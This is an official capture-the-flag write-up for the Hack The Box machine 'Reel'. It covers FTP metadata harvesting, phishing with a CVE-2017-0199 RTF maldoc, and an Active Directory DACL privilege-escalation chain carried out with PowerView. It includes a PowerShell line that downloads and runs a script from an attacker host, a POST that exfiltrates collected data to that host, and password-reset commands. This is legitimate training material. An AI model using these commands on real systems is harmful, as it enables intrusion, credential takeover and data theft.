# Reel

*Converted from: Reel.pdf*

---

# Reel
## **10 [th] November 2018 / Document No D18.100.26**

**Prepared By: egre55**

**Machine Author: egre55**

**Difficulty: Hard**

**Classification: Official**


Page 1 / 13


## **SYNOPSIS**

Reel is medium to hard difficulty machine, which requires a client-side attack to bypass the

perimeter, and highlights a technique for gaining privileges in an Active Directory environment.


## **Skills Required**


  - Basic knowledge of client-side attack

techniques

  - Intermediate Knowledge of Windows


## **Skills Learned**


  - Extraction and use of document

metadata in a phishing attack

  - Creation of attacker infrastructure

(malicious SMTP server, web server

and listener)

  - Identification and exploitation of Active

Directory DACL attack chain


Page 2 / 13


## **Enumeration** **Nmap**

masscan -p1-65535 10.10.10.77 --rate=1000 -e tun0 > ports


ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')


nmap -Pn -sV -sC -p$ports 10.10.10.77


Active Directory Domain services.


Page 3 / 13


## **FTP Enumeration**

It seems FTP supports anonymous authentication. After enumerating the directories, the files are

downloaded for further inspection.


Running exiftool against “Windows Event Forwarding.docx” reveals the email address

nico@megabank.com.


AppLocker.docx reveals some security details of the organisation, namely that AppLocker has

been enabled, and hash rules are in effect for executables, MSIs, and scripts (.ps1, .vbs, .cmd, .bat

and .js). The note also reveals that the the organisation is in the process of converting procedure

documents from RTF to a newer format, which will require the document to be opened for review.


Page 5 / 13


## **Exploitation** **Payload and Infrastructure Creation**

CVE-2017-0199 is a fairly recent vulnerability that affected RTF files, and @bhdresh has created a

toolkit to create RTF maldocs and exploit this vulnerability with HTA payloads.


[https://github.com/bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)


The Empire post exploitation project is developed by @harmj0y, @sixdub, @enigma0x3, rvrsh3ll,

@killswitch_gui, and @xorrior, and is a good choice for generating the malicious .hta and

receiving the callback.


[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)


GoPhish is a Phishing Toolkit maintained by @jordan-wright, and will be used to deliver the

payload.


[https://github.com/gophish/gophish](https://github.com/gophish/gophish)


Page 6 / 13


GoPhish, Empire, the CVE-2017-0199 toolkit and web server are stood up and configured

accordingly, the malicious payload is delivered and an agent callback is received.


Page 7 / 13


Page 8 / 13


​ ​


## **Identification of Active Directory DACL Attack Chain**

After logging in as Tom over SSH, an “AD Audit” folder is visible on the desktop. It seems that

Tom has been using BloodHound to assess the organisation’s Active Directory security.

BloodHound is developed by @_wald0, @CptJesus, and @harmj0y, and allows attackers and

defenders to identify privilege escalation opportunities in the complex relationship of objects and

permissions present in Windows Domains.


[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)


A note in the folder reveals that no attack paths to Domain Admins were found, although paths to

other privileged groups should also be checked. The ADSI query below will return a list of groups

in the domain.


$groups = [adsi] "LDAP://REEL:389/OU=Groups,DC=HTB,DC=LOCAL"

$searcher = New-Object System.DirectoryServices.DirectorySearcher $groups

$searcher.Filter = '(objectClass=Group)'

$results = $searcher.FindAll()

foreach ($result in $results) {$group = $result.Properties;$group.name}


The custom “Backup_Admins” group is potentially interesting from a privilege escalation

perspective.


There is an existing ACL csv output file, but as BloodHound has moved on to ingestion of JSON

files, the audit data should be collected again. The following links may be useful when installing

BloodHound.


[https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)

[https://github.com/BloodHoundAD/BloodHound/issues/173](https://github.com/BloodHoundAD/BloodHound/issues/173)


The SharpHound PowerShell file is used, and a default data collection of all methods is invoked.


[IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.15:8080/SharpHound.ps1​](http://10.10.14.15:8080/SharpHound.ps1) "​ )

Invoke-BloodHound -CollectionMethod All


Page 9 / 13


The generated zip file is transferred back to the attacker by sending the base64 encoded zip file

as a POST request.


$Base64String = [System.convert]::ToBase64String((Get-Content -Path

'c:/users/tom/downloads/20181110013202_BloodHound.zip' -Encoding Byte))

Invoke-WebRequest -Uri http://10.10.14.15:443 -Method POST -Body $Base64String


After catching the base64 data with netcat, the payload is decoded and unzipped.


echo <base64 encoded zip file> | base64 -d -w 0 > bloodhound_reel.zip


Page 10 / 13


The JSON files are then imported into BloodHound. The Cypher query below will identify if there

are any attack paths to the “Backup_Admins” group.


MATCH (n:User), (m:Group {name: "BACKUP_ADMINS@HTB.LOCAL"}),

p=shortestPath((n)-[*1..]->(m)) RETURN p


It seems that multiple attack paths are possible. Tom and Nico have the ability to change the

owner of the Claire and Herman objects respectively. Claire and Herman in turn are able to write

an ACE to the Backup_Admins DACL.


Page 11 / 13


## **Exploitation of Active Directory DACL Attack Chain**

PowerView is also present in the Audit folder. It is developed by @harmj0y and is a great tool for

enumerating and attacking Windows domain environments.


The ability to set the object owner is abusable by Set-DomainObjectOwner

The ability to write to the DACL is abusable by Add-DomainObjectAcl

The ability to reset a user’s password is abusable by Set-DomainUserPassword

The ability to a group’s membership is abusable by Add-DomainGroupMember


Armed with this knowledge, the following PowerView commands allow the DACL attack chain to

be exploited.


Set-DomainObjectOwner -Identity claire -OwnerIdentity tom


Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword

-Verbose


$UserPassword = ConvertTo-SecureString 'Sup3rS3cr3t!' -AsPlainText -Force -Verbose


Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword -Verbose


$Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $UserPassword)


Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $Cred


Page 12 / 13


## **Privilege Escalation from Claire to Administrator**

After logging in as Claire, it seems that membership of the “Backup_Admins” group provides

access to the Administrator profile, and the Backup Scripts folder. Cleartext Domain

Administrator credentials have been stored in “BackupScript.ps1”. A shell as the Domain

Administrator and the root flag can now be obtained.


Page 13 / 13


